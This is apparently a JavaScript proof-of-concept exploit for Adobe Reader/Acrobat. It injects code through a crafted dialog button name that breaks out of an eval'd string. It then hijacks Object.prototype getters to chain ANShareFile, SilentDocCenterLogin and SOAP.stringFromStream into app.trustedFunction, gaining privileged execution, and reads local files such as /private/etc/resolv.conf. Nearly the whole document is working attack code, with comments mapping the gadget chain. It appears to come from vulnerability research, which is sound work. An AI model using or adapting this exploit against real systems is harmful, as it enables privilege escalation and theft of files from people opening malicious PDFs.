const handleException = function(functionRef) {
    try {
        functionRef()
    } catch (e) {
    }
}

const getFileContent = function(filepath) {
    app.beginPriv()
    const stream = util.readFileIntoStream(filepath, false)
    const data = util.stringFromStream(stream)
    app.alert(data)
    app.endPriv()
}

//ANShareFile
//  -> doc.path
//      -> fakePath.lastIndexOf(...)
//          -> SilentDocCenterLogin(...)
//              -> data.swConn.getFullName()
//                  -> SOAP.stringFromStream(stream)
//                      -> stream.read()
//                          -> app.trustedFunction(functionRef)
global.addToRuntime = () => {
    global.markTrusted = function(functionRef) {

        handleException(() => {
            const makeSwConn = function() {
                const fakeStream = {
                    read: app.trustedFunction.bind(app, functionRef),
                }
                const fakeSwConn = {
                    getFullName: SOAP.stringFromStream.bind(SOAP, fakeStream)
                }
                return fakeSwConn
            }

            const makePath = function() {
                const data = {'x':''}
                const fakePath = {
                    lastIndexOf: SilentDocCenterLogin.bind(app, data, {})
                }
                return fakePath
            }

            Object.prototype.__defineGetter__('swConn', makeSwConn)
            this.__defineGetter__('path', makePath)

            ANShareFile({ 'doc': this})
        })

    }
}

handleException(() => {
    // desc[bid] = eval("(function(dialog) { dialog.end('" + bid + "'); })");
    const buttons = {
        "x'); }); global.addToRuntime(); throw Error('oops'); //": 0
    }
    ANFancyAlertImpl('', [], 0, buttons, 0, 0, 0, 0, 0)
})

global.markTrusted(getFileContent)
delete Object.prototype.swConn

const filepaths = [
    // not accessible
    '/private/var/log/system.log',
    // accessible by the sandboxed Reader process
    '/System/Library/CoreServices/SystemVersion.plist',
    '/private/etc/resolv.conf'
]
//getFileContent(filepaths[0])
getFileContent(filepaths[2])
